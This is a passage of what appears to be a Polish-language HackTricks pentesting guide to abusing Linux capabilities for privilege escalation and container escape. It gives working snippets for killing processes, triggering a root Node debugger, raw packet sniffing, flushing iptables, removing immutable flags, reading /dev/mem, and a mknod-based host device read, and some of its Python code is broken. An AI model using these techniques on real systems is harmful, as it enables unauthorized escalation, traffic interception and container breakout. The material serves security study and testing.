[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonywanie wielu wrażliwych operacji, w tym dostęp do `/dev/mem`, `/dev/kmem` lub `/proc/kcore`, modyfikowanie `mmap_min_addr`, korzystanie z wywołań systemowych `ioperm(2)` i `iopl(2)` oraz wykonywanie różnych poleceń dyskowych. Ta capability umożliwia również użycie `FIBMAP ioctl(2)`, co w [przeszłości](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) powodowało problemy. Zgodnie ze stroną man pozwala ona także posiadaczowi wykonywać różne operacje specyficzne dla urządzeń na innych urządzeniach.<sup>[[14]](#references)</sup>

Może to być przydatne do **privilege escalation** i **Docker breakout**.<sup>[[14]](#references)</sup>

Sama capability nie udostępnia użytecznego interfejsu. Do przeprowadzenia container breakout potrzebne są ponadto dostępne urządzenie lub zasób hosta, odpowiednie uprawnienia device-cgroup i systemu plików, a także technika zależna od sprzętu i jądra. Ścisłe ograniczenia `/dev/mem`, kernel lockdown, wirtualizacja, seccomp i polityka LSM często blokują ogólne ścieżki. Najpierw zweryfikuj capability i dostępne zasoby:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Jeśli `/dev/mem` jest zatwierdzonym interfejsem, w odizolowanym laboratorium można zademonstrować ujawnienie pamięci węzła poza granicami przez odczytanie i zahashowanie zakresu wybranego na podstawie mapy sprzętowej tego laboratorium:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Nie zgaduj zakresu: odczyt niektórych regionów MMIO może powodować skutki uboczne, a prawidłowy adres na jednej platformie może sterować sprzętem lub pamięcią jądra na innej. Modyfikowanie pamięci jądra lub sterowanie urządzeniami wymaga zatwierdzonego, specyficznego dla platformy dowodu; nie istnieje bezpieczny, uniwersalny przykład bezpośredniego zapisu.

## CAP_KILL

**Ta capability omija kontrole uprawnień przy wysyłaniu sygnałów do procesów w przypadkach określonych przez jądro**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Załóżmy, że plik binarny **`python`** ma tę capability. Jeśli udałoby ci się **również zmodyfikować konfigurację jakiejś usługi lub gniazda** (albo dowolny plik konfiguracyjny powiązany z usługą), mógłbyś umieścić w nim backdoor, a następnie zabić proces powiązany z tą usługą i poczekać, aż nowy plik konfiguracyjny zostanie wykonany z twoim backdoorem.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc z kill**

Jeśli masz capabilities kill, a jakiś **program Node działa jako root** (lub jako inny użytkownik), możesz prawdopodobnie **wysłać** mu **sygnał SIGUSR1**, aby **otworzyć debugger Node**, z którym możesz się połączyć.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ta capability pozwala na nasłuchiwanie na portach internetowych poniżej 1024.** Nie zapewnia bezpośrednio szerszych możliwości eskalacji uprawnień.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli **`python`** ma tę capability, będzie mógł nasłuchiwać na dowolnym porcie, a nawet łączyć się z niego z dowolnym innym portem (niektóre usługi wymagają połączeń z portów uprzywilejowanych)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesom **tworzenie gniazd RAW i PACKET**, pozwalając im generować i wysyłać dowolne pakiety sieciowe. Może to prowadzić do zagrożeń bezpieczeństwa w środowiskach kontenerowych, takich jak spoofing pakietów, wstrzykiwanie ruchu i omijanie mechanizmów kontroli dostępu do sieci. Złośliwe osoby mogą wykorzystać tę możliwość do zakłócania routingu kontenerów lub naruszenia bezpieczeństwa sieci hosta, zwłaszcza przy braku odpowiedniej ochrony zapory sieciowej. Ponadto **CAP_NET_RAW** obsługuje takie operacje jak ping za pomocą żądań RAW ICMP.<sup>[[14]](#references)</sup>

**Może to umożliwić przechwytywanie pakietów za pomocą odpowiedniego interfejsu gniazda.** Nie zapewnia bezpośrednio szerszej eskalacji uprawnień.<sup>[[14]](#references)</sup>

W przypadku ścieżki prowadzącej do ujawnienia danych uwierzytelniających sprawdź również, czy bieżące konto może uruchomić narzędzie do przechwytywania z efektywnymi capabilities, czy odpowiedni ruch przechodzi przez interfejs widoczny w jego network namespace oraz czy dane uwierzytelniające są przesyłane jawnym tekstem. Na przykład dane uwierzytelniające HTTP Basic przesyłane niezabezpieczonym HTTP mogą być widoczne na loopback, jeśli narzędzie do przechwytywania ma dostęp do tego interfejsu. Przejście na inne konto wymaga ponadto, aby przechwycone dane uwierzytelniające działały dla innej tożsamości; file capability ani widoczne żądanie logowania same w sobie nie dowodzą ponownego użycia hasła.

Na hoście bezprzewodowym wskazówką wartą sprawdzenia może być również wykonywalne narzędzie do audytu WPS, takie jak `reaver`, z efektywnym `CAP_NET_RAW`, oraz AP i interfejs w trybie monitorowania widoczne przez `iw dev`. **Nie** dowodzi to możliwości skutecznej eskalacji uprawnień: AP musi obsługiwać uwierzytelnianie za pomocą PIN-u WPS bez skutecznej blokady, być osiągalny z interfejsu bezprzewodowego i ujawniać PSK; uprawnienia hosta zmieniają się tylko wtedy, gdy ten PSK jest ponownie używany dla konta. Pasywne rozpoznanie powinno raportować tryby interfejsów i capabilities, a nie wysyłać sond ani próbować PIN-ów. Informacje o podatności PIN-u WPS znajdziesz w [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755), a informacje o działaniu narzędzia w [dokumentacji projektu Reaver](https://github.com/shift/reaver-wps).

**Przykład z plikiem binarnym**

Jeśli plik binarny **`tcpdump`** ma tę capability, możesz go użyć do przechwytywania informacji o sieci.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Jeśli **środowisko** przyznaje tę capability, **`tcpdump`** również może jej użyć do sniffowania ruchu.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym 2**

Poniższy przykład to kod **`python2`**, który może się przydać do przechwytywania ruchu z interfejsu „**lo**” (**localhost**). Kod pochodzi z laboratorium „_The Basics: CAP-NET_BIND + NET_RAW_” dostępnego na stronie [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) daje posiadaczowi możliwość **zmieniania konfiguracji sieci**, w tym ustawień zapory sieciowej, tablic routingu, uprawnień gniazd i ustawień interfejsów sieciowych w bieżącej przestrzeni nazw sieci. Może też włączyć tryb promiscuous na interfejsie w tej przestrzeni nazw; może to ujawnić ruch docierający do tego interfejsu, ale samo w sobie nie pozwala na przechwytywanie ruchu z dowolnych interfejsów w innych przestrzeniach nazw sieci.<sup>[[14]](#references)</sup>

Operacje te dotyczą **bieżącej przestrzeni nazw sieci** procesu. Kontrola stanu sieci hosta wymaga `--network=host`, Kubernetes `hostNetwork: true` lub osobnego mechanizmu wejścia do przestrzeni nazw. Samo `CAP_NET_RAW` nie zapewnia ogólnej powłoki hosta, ale było elementem udokumentowanego, specyficznego dla protokołu sposobu ucieczki: historyczny łańcuch w GCE łączył uprawnienia roota, przestrzeń nazw sieci hosta, `CAP_NET_ADMIN`, `CAP_NET_RAW`, nieszyfrowany ruch metadanych i podatne na wyścig żądanie guest agenta służące do wstrzyknięcia klucza SSH. Pełne wymagania wstępne i współczesne uwagi dotyczące metadanych HTTPS opisano w [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html).

**Przykład z plikiem binarnym**

Załóżmy, że **plik binarny python** ma następujące capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Ta capability pozwala modyfikować flagi inode, takie jak immutable i append-only. Nie zapewnia bezpośrednio szerszych uprawnień do eskalacji uprawnień.**<sup>[[14]](#references)</sup>

**Przykład z użyciem pliku binarnego**

Jeśli okaże się, że plik jest immutable, a python ma tę capability, możesz **usunąć atrybut immutable i umożliwić modyfikowanie pliku:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Operacje `FS_IOC_GETFLAGS` i `FS_IOC_SETFLAGS` odczytują i aktualizują flagi inode; `FS_IMMUTABLE_FL` to flaga niezmienności, którą ten przykład usuwa.<sup>[[27]](#references)</sup>

> [!TIP]
> Zwróć uwagę, że ten atrybut niezmienności zwykle ustawia się i usuwa za pomocą:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co może pozwolić na ucieczkę ze słabo skonstruowanego więzienia `chroot(2)` przy użyciu znanych technik.<sup>[[11]](#references)[[14]](#references)</sup>

To **uprawnienie pozwalające na ucieczkę z więzienia chroot, a nie samodzielną ucieczkę z kontenera na hosta**. Nie udostępnia systemu plików hosta ani nie omija jego uprawnień. Jeśli katalog główny hosta jest już zamontowany lub dostępny przez `/proc/<pid>/root`, `chroot()` jedynie ustawia to istniejące drzewo jako katalog główny ścieżek procesu. Niezależnie od tego zmiana przestrzeni nazw montowań za pomocą `setns(2)` wymaga zarówno `CAP_SYS_CHROOT`, jak i `CAP_SYS_ADMIN` w przestrzeni nazw użytkownika wywołującego, a także `CAP_SYS_ADMIN` w przestrzeni nazw użytkownika będącej właścicielem docelowej przestrzeni nazw montowań.<sup>[[14]](#references)</sup>

- [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: narzędzie do ucieczki z chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `reboot(2)` w celu ponownego uruchomienia systemu, w tym poleceń takich jak `LINUX_REBOOT_CMD_RESTART2`; umożliwia też użycie `kexec_load(2)` oraz, od wersji Linux 3.17, `kexec_file_load(2)` do załadowania odpowiednio nowego lub podpisanego jądra awaryjnego.<sup>[[14]](#references)</sup>

W prywatnej przestrzeni nazw PID obsługiwane żądanie `reboot()` kończy działanie procesu init tej przestrzeni nazw zamiast ponownie uruchamiać hosta. Wpływ na ponowne uruchomienie hosta wymaga więc początkowej przestrzeni nazw PID, zwykle poprzez współdzielenie PID hosta. Przejęcie systemu za pomocą kexec wymaga dodatkowo zgodnego obrazu, dostępnego wywołania systemowego oraz liberalnej polityki lockdown i weryfikacji podpisów. Nie uruchamiaj żadnej z tych operacji na współdzielonym hoście tylko po to, by sprawdzić to uprawnienie:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) została wydzielona z szerszej **CAP_SYS_ADMIN** w Linuksie 2.6.37, aby przyznać możliwość używania wywołania `syslog(2)`. Ta capability umożliwia wyświetlanie adresów jądra za pośrednictwem `/proc` i podobnych interfejsów, gdy ustawienie `kptr_restrict` ma wartość 1 i kontroluje ujawnianie adresów jądra. Od Linuksa 2.6.39 domyślną wartością `kptr_restrict` jest 0, co oznacza, że adresy jądra są ujawniane, choć ze względów bezpieczeństwa wiele dystrybucji ustawia tę wartość na 1 (ukrywanie adresów przed wszystkimi poza uid 0) lub 2 (zawsze ukrywaj adresy).<sup>[[14]](#references)</sup>

Ponadto **CAP_SYSLOG** umożliwia dostęp do wyjścia `dmesg`, gdy `dmesg_restrict` ma wartość 1. Mimo tych zmian **CAP_SYS_ADMIN** zachowuje możliwość wykonywania operacji `syslog` ze względu na historyczne uwarunkowania.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) rozszerza funkcjonalność wywołania systemowego `mknod` poza tworzenie zwykłych plików, FIFO (potoków nazwanych) lub gniazd domeny UNIX. Umożliwia w szczególności tworzenie plików specjalnych, takich jak:<sup>[[14]](#references)</sup>

- **S_IFCHR**: specjalne pliki znakowe, czyli urządzenia takie jak terminale.
- **S_IFBLK**: specjalne pliki blokowe, czyli urządzenia takie jak dyski.

Ta capability jest przydatna dla procesów, które muszą tworzyć pliki urządzeń, w tym urządzeń znakowych lub blokowych.<sup>[[14]](#references)</sup>

Jest uwzględniona w udokumentowanym domyślnym zestawie capabilities Dockera; sprawdź faktyczną konfigurację środowiska uruchomieniowego, zamiast zakładać, że każde wdrożenie korzysta z tych samych ustawień domyślnych ([domyślna lista capabilities Moby](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

W przypadku container escape `CAP_MKNOD` może utworzyć brakujący uchwyt do rzeczywistego urządzenia hosta, ale **nie** tworzy samego urządzenia i **nie** omija device cgroup. Pełny łańcuch wymaga:

1. Efektywnej `CAP_MKNOD` w początkowej przestrzeni nazw użytkowników, ponieważ tworzenie urządzeń nie jest namespacowane.
2. Prawidłowego typu blokowego lub znakowego oraz numerów głównych/podrzędnych rzeczywistego urządzenia hosta.
3. Zezwolenia device cgroup na otwarcie tego urządzenia.
4. Czytnika obsługującego dany system plików albo `CAP_SYS_ADMIN` do zamontowania systemu plików na urządzeniu blokowym.
5. Uprawnień systemu plików i LSM do utworzenia i używania węzła.

W przypadku laboratoryjnego urządzenia blokowego z systemem plików z rodziny ext, którego rzeczywiste numery główny/podrzędny to `252:1`, walidacja tylko do odczytu wygląda następująco:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Zastąp numery wartościami podanymi przez `/sys/class/block/<device>/dev`. Jeśli utworzenie węzła się powiedzie, ale jego otwarcie zwróci `Operation not permitted`, dostęp nadal blokuje device cgroup. To normalny wynik w kontenerze, który ma jedynie domyślne `CAP_MKNOD` Dockera, bez jawnego zezwolenia na urządzenie.

Istnieje również odrębna technika **lokalnego podniesienia uprawnień wymagająca dwóch punktów zaczepienia**, której nie należy mylić z bezpośrednim dostępem kontenera do urządzenia. Proces root w kontenerze współdzielącym początkową przestrzeń nazw użytkowników może utworzyć węzeł urządzenia blokowego, a nieuprzywilejowana powłoka na hoście, mająca zgodny UID, może otworzyć ten węzeł przez `/proc/<container-pid>/root`. Otwarcie jest wtedy sprawdzane w cgroup powłoki hosta, więc odmowa dostępu przez device cgroup kontenera nie chroni już urządzenia.<sup>[[7]](#references)</sup>

W kontenerze utwórz węzeł i pozostaw uruchomiony proces z UID istniejącego punktu zaczepienia na hoście:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Z istniejącej powłoki hosta działającej z tym UID zidentyfikuj PID hosta uśpionego procesu kontenera i użyj jego procfs root jako ścieżki do urządzenia:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Ten łańcuch wymaga obu footholdów, przestrzeni nazw użytkowników z mapowaniem identity lub współdzielonej, uprawnień do przechodzenia przez `/proc/<pid>/root` procesu docelowego, rzeczywistego urządzenia z prawidłowymi numerami major/minor oraz zewnętrznego cgroup, który zezwala na otwarcie. `hidepid`, reguły dostępu ptrace, LSM, niezgodność systemu plików lub remapowanie przestrzeni nazw użytkowników mogą go przerwać. Historyczna technika jest cenna właśnie dlatego, że wyjaśnia, jak `/proc/<pid>/root` może ominąć ograniczenie device cgroup *kontenera*; nie oznacza to, że samo `CAP_MKNOD` pozwala uciec z normalnie izolowanego kontenera.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

W aktualnych jądrach Linux obsługujących capabilities plików **`CAP_SETPCAP`** pozwala wątkowi dodać capabilities ze swojego bounding set do inheritable set, usunąć capabilities ze swojego bounding set oraz zmienić securebits. Nie pozwala procesowi dowolnie nadawać capabilities innym procesom; takie zachowanie dotyczy wyłącznie jąder sprzed wersji 2.6.25, które nie obsługiwały capabilities plików.<sup>[[14]](#references)</sup>

Wywołanie systemowe `capset()` może zmieniać własne zbiory effective, permitted i inheritable wątku, ale nowy zbiór permitted nie może zawierać capabilities spoza istniejącego zbioru permitted, a zmiany zbioru inheritable nadal podlegają ograniczeniom jądra.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - laboratoria eskalacji uprawnień z użyciem Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - eskalacja uprawnień w Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Podstawy kontenerów Linux: capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Wykorzystanie Linux capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Nadmierne capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Nadużywanie dostępu do przestrzeni nazw montowań przez /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: dlaczego istnieją i jak działają](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Zrozumieć capabilities w Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC obejścia seccomp, jeśli ptrace jest dozwolone](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - oryginalny exploit CAP_DAC_READ_SEARCH do ucieczki z Docker autorstwa Sebastiana Krahmera](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analiza exploita do ucieczki z Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - strona podręcznika Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - strona podręcznika Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - strona podręcznika Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Uruchamianie kontenerów - dokumentacja Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - dokumentacja Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - strona podręcznika Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - strona podręcznika Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - strona podręcznika Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
